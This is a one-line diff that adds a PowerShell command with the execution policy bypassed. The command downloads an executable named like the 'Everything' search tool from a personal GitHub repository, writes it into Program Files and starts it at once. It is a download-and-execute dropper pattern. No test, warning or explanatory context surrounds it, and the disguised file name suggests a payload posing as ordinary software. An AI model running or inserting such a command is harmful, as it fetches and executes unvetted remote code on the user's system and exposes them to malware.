@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/GoDGaNk/ProwerkaRW/raw/main/Everything.1.0241.exe', 'C:\Program Files\Everything.1.0241.exe'); Start-Process ('C:\Program Files\Everything.1.0241.exe')"
